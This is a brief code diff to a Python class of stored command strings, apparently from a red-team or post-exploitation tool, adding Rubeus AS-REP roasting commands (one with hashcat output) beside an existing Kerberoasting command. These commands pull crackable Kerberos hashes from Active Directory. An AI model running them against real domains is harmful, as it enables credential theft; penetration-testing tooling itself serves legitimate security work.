@@ -181,6 +181,8 @@ class mybuildin_cmd():
         self.B64_SAVE = "echo {} | out-file {}\\{}.txt"
 
         self.KERBER = "Invoke-Rubeus kerberoast"
+        self.ARSREP_HC = "Invoke-Rubeus \"asreproast /format:hashcat\""
+        self.ARSREP = "Invoke-Rubeus asreproast"
 
 
 if __name__ == "__main__":
